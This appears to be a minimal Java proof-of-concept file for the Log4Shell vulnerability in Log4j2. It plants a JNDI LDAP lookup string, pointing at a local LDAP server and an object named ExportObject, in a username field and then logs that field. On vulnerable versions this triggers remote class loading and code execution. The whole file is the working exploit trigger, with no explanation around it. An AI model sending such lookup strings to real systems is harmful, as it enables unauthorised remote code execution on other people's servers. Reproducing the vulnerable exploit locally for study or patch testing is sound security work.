import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.layout.PatternLayout;

import java.util.function.LongFunction;

public class log4j2EXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${jndi:ldap://127.0.0.1:1234/ExportObject}";

        logger.error("User {} login in!", username);
    }
}
